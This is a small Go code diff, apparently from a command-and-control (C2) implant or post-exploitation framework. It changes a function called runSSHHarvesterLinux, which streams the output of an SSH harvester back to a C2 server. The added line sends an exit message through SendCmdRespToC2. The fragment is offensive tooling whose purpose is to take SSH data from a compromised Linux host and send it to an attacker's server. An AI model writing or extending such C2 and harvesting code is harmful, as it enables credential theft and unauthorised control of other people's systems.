@@ -129,5 +129,6 @@ func runSSHHarvesterLinux(cmd *cobra.Command, args []string) {
 			out := <-harvesterLogStream
 			SendCmdRespToC2(out, cmd, args)
 		}
+		SendCmdRespToC2("SSH harvester log stream exited", cmd, args)
 	}()
 }
